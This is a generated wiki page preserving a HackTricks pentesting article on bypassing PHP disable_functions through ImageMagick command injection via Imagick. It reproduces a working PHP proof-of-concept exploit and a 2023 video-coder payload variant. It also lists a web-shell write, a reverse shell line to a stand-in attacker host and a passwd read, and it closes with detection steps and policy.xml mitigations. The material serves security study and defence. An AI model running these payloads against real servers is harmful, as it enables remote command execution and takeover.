---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Imagick <= 3.3.0  ‑ PHP >= 5.4  *disable_functions* Bypass

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-network-services-pentesting-pentesting-web-php-tricks-esp-php-useful-functions-disable-functions-open-basedir-bypass-disable-functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Imagick <= 3.3.0  ‑ PHP >= 5.4  *disable_functions* Bypass](../../topics/network-services-pentesting/imagick-3.3.0-php-5.4-disable-functions-bypass.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-network-services-pentesting-pentesting-web-php-tricks-esp-php-useful-functions-disable-functions-open-basedir-bypass-disable-functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit |
| name | Imagick <= 3.3.0  ‑ PHP >= 5.4  *disable_functions* Bypass |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md |

## Preserved Source Material

````yaml
_body: "# Imagick <= 3.3.0  ‑ PHP >= 5.4  *disable_functions* Bypass\n\n{{#include ../../../../banners/hacktricks-training.md}}\n\
  \n> The well-known *ImageTragick* family of bugs (CVE-2016-3714 et al.) allows an attacker to reach the underlying **ImageMagick**\
  \ binary through crafted MVG/SVG input. When the PHP extension **Imagick** is present this can be abused to execute shell\
  \ commands even if every execution-oriented PHP function is black-listed with `disable_functions`.\n>\n> The original PoC\
  \ published by RicterZ (Chaitin Security Research Lab) in May 2016 is reproduced below.  The technique is still regularly\
  \ encountered during contemporary PHP 7/8 audits because many shared-hosting providers  simply compile PHP without `exec`/`system`\
  \ but keep an outdated Imagick + ImageMagick combo.\n\nFrom <http://blog.safebuff.com/2016/05/06/disable-functions-bypass/>\n\
  \n```php\n# Exploit Title : PHP Imagick disable_functions bypass\n# Exploit Author: RicterZ  (ricter@chaitin.com)\n# Versions\
  \      : Imagick <= 3.3.0  |  PHP >= 5.4\n# Tested on     : Ubuntu 12.04 (ImageMagick 6.7.7)\n# Usage         : curl \"\
  http://target/exploit.php?cmd=id\"\n<?php\n// Print the local hardening status\nprintf(\"Disable functions: %s\\n\", ini_get(\"\
  disable_functions\"));\n$cmd = $_GET['cmd'] ?? 'id';\nprintf(\"Run command: %s\\n====================\\n\", $cmd);\n\n$tmp\
  \   = tempnam('/tmp', 'pwn');     // will hold command output\n$mvgs  = tempnam('/tmp', 'img');     // will hold malicious\
  \ MVG script\n\n$payload = <<<EOF\npush graphic-context\nviewbox 0 0 640 480\nfill 'url(https://example.com/x.jpg\"|$cmd\
  \ >$tmp\")'\npop graphic-context\nEOF;\n\nfile_put_contents($mvgs, $payload);\n$img = new Imagick();\n$img->readImage($mvgs);\
  \     // triggers convert(1)\n$img->writeImage(tempnam('/tmp', 'img'));\n$img->destroy();\n\necho file_get_contents($tmp);\n\
  ?>\n```\n\n---\n\n## Why does it work?\n\n1. `Imagick::readImage()` transparently spawns the **ImageMagick** *delegate*\
  \ (`convert`/`magick`) binary.\n2. The MVG script sets the *fill* to an external URI.  When a double quote (`\"`) is injected,\
  \ the remainder of the line is interpreted by `/bin/sh ‑c`  that ImageMagick uses internally → arbitrary shell execution.\n\
  3. All happens outside of the PHP interpreter, therefore *`disable_functions`*, *open_basedir*, `safe_mode` (removed in\
  \ PHP 5.4) and similar in-process restrictions are completely bypassed.\n\n## 2025 status – it is **still** relevant\n\n\
  * Any Imagick version that relies on a vulnerable ImageMagick backend remains exploitable.  In lab tests the same payload\
  \ works on PHP 8.3 with **Imagick 3.7.0** and **ImageMagick 7.1.0-51** compiled without a hardened `policy.xml`.\n* Since\
  \ 2020 several additional command-injection vectors have been found (`video:pixel-format`, `ps:`, `text:` coders…).  Two\
  \ recent public examples are:\n  * **CVE-2020-29599** – shell injection via the *text:* coder.\n  * **GitHub issue #6338**\
  \ (2023) – injection in the *video:* delegate.\n\nIf the operating system ships ImageMagick < **7.1.1-11** (or 6.x < **6.9.12-73**)\
  \ without a restrictive policy file, exploitation is straightforward.\n\n## Modern payload variants\n\n```php\n// --- Variant\
  \ using the video coder discovered in 2023 ---\n$exp = <<<MAGICK\npush graphic-context\nimage over 0,0 0,0 'vid:dummy.mov\"\
  \ -define video:pixel-format=\"rgba`uname -a > /tmp/pwned`\" \" dummy'\npop graphic-context\nMAGICK;\n$img = new Imagick();\n\
  $img->readImageBlob($exp);\n```\n\nOther useful primitives during CTFs / real engagements:\n\n* **File write**  – `... >\
  \ /var/www/html/shell.php`  (write web-shell outside *open_basedir*)\n* **Reverse shell** – `bash -c \"bash -i >& /dev/tcp/attacker/4444\
  \ 0>&1\"`\n* **Enumerate** – `id; uname -a; cat /etc/passwd`\n\n## Quick detection & enumeration\n\n```bash\n# PHP side\n\
  php -r 'echo phpversion(), \"\\n\"; echo Imagick::getVersion()[\"versionString\"], \"\\n\";'\n\n# System side\nconvert -version\
  \ | head -1                 # ImageMagick version\nconvert -list policy | grep -iE 'mvg|https|video|text'   # dangerous\
  \ coders still enabled?\n```\n\nIf the output shows the `MVG` or `URL` coders are *enabled* the target is probably exploitable.\n\
  \n## Mitigations\n\n1. **Patch/Upgrade**  – Use ImageMagick ≥ *7.1.1-11* (or the latest 6.x LTS) and Imagick ≥ *3.7.2*.\n\
  2. **Harden `policy.xml`**  – explicitly *disable* high-risk coders:\n\n   ```xml\n   <policy domain=\"coder\" name=\"MVG\"\
  \ rights=\"none\"/>\n   <policy domain=\"coder\" name=\"MSL\" rights=\"none\"/>\n   <policy domain=\"coder\" name=\"URL\"\
  \ rights=\"none\"/>\n   <policy domain=\"coder\" name=\"VIDEO\" rights=\"none\"/>\n   <policy domain=\"coder\" name=\"PS\"\
  \ rights=\"none\"/>\n   <policy domain=\"coder\" name=\"TEXT\" rights=\"none\"/>\n   ```\n\n3. **Remove the extension**\
  \  on untrusted hosting environments.  In most web stacks `GD` or `Imagick` is not strictly required.\n4. Treat `disable_functions`\
  \ only as *defence-in-depth* – never as a primary sandboxing mechanism.\n\n## References\n\n* [GitHub ImageMagick issue\
  \ #6338 – Command injection via video:pixel-format (2023)](https://github.com/ImageMagick/ImageMagick/issues/6338)\n* [CVE-2020-29599\
  \ – ImageMagick shell injection via text: coder](https://nvd.nist.gov/vuln/detail/CVE-2020-29599)\n{{#include ../../../../banners/hacktricks-training.md}}"
_relative_path: network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md
````
